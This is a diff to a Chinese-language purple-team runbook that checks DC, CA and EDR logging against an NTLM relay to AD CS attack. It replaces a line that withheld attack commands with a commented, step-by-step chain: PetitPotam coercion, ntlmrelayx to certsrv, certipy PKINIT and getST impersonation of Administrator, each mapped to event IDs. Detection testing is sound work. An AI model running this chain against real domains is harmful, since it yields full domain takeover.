@@ -30,18 +30,63 @@
 ### Step 1: 基線確認 (DC / CA / EDR)
 先確認 DC 與 CA 的稽核項目已啟用，並確認 EDR 已收集 Security Log 與 AD CS 相關日志。
 
-### Step 2: 執行內部核准模擬劇本 (Lab)
-在隔離 Lab 中執行你們已核准的 NTLM Relay 模擬腳本或測試平台，不在本文件提供可直接濫用的攻擊指令。
-本步驟目標是觸發以下行為鏈：強制認證 -> Relay 到 AD CS -> 憑證式 Kerberos 驗證 -> S4U 模擬 -> 高權限存取。
+### Step 2: 工具準備與環境設定
+在攻擊機 (Kali Linux) 準備必要的工具和環境：
+```bash
+# 安裝必要工具（參考你們內部核准的安裝方法）
+# Impacket: 用於 ntlmrelayx 和相關 Kerberos 工具
+# certipy: 用於 PKINIT 憑證認證
+# PetitPotam: 用於觸發強制認證
 
-### Step 3: 現場核對 Relay/AD CS 結果
-在 CA 端確認是否出現憑證申請與簽發事件，並記錄請求主體是否為 DC 機器帳號。
+# 設定攻擊機監聽介面
+ip addr show  # 確認攻擊機 IP
+```
 
-### Step 4: 現場核對 Kerberos 與 S4U 特徵
-在 DC 端核對 Kerberos 票證事件，重點檢查 PKINIT 與 S4U2Self 欄位特徵，而非僅看 Event ID 是否存在。
+### Step 3: 觸發強制認證 (PetitPotam)
+使用核准的觸發工具強制 DC 向攻擊機發起 NTLM 認證：
+```bash
+# 參考格式：觸發 DC 向攻擊機發起認證
+# python3 PetitPotam.py ATTACKER_IP DC_IP
+# 這會產生 Event 4648 (DC 機器帳號向攻擊機發起認證)
+```
 
-### Step 5: 驗證最終高權限行為
-在 DC 端核對高權限登入、特權指派、程序建立與目錄複寫相關事件，並比對 EDR 是否產生對應告警。
+### Step 4: 啟動 NTLM Relay 監聽
+設定 ntlmrelayx 監聽並轉發到 AD CS：
+```bash
+# 參考格式：啟動 relay 監聽，指向 AD CS Web Enrollment
+# ntlmrelayx.py -t https://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+# 監聽在攻擊機的 SMB 端口，等待 DC 連線
+```
+
+### Step 5: 處理憑證與 PKINIT 認證
+當 relay 成功後，處理取得的憑證並進行 Kerberos PKINIT：
+```bash
+# 參考格式：使用 certipy 進行 PKINIT 認證
+# certipy auth -pfx DC_CERTIFICATE.pfx -dc-ip DC_IP -username DC$
+# 這會產生 Event 4768 (PKINIT TGT 請求)
+```
+
+### Step 6: S4U2Self 特權提升
+使用取得的 TGT 進行 S4U2Self 模擬：
+```bash
+# 參考格式：使用 getST 進行 S4U2Self
+# getST.py -dc-ip DC_IP DOMAIN/DC$ -impersonate Administrator -spn cifs/DC_FQDN -k
+# 這會產生 Event 4769 (S4U2Self 服務票證請求)
+```
+
+### Step 7: 驗證高權限存取
+使用取得的服務票證驗證權限提升：
+```bash
+# 參考格式：驗證管理員權限
+# 使用取得的票證執行權限驗證操作
+# 這會產生對應的 4624、4672、4688 等事件
+```
+
+### Step 8: 現場核對與驗證
+在每個步驟執行後，立即在對應系統核對事件記錄：
+- DC: 檢查 Security Log 中對應 Event ID
+- CA: 檢查 AD CS 稽核日志
+- EDR: 確認事件收集和告警觸發狀況
 
 ## 5. 驗證對照表 (Verification Checklist)
 
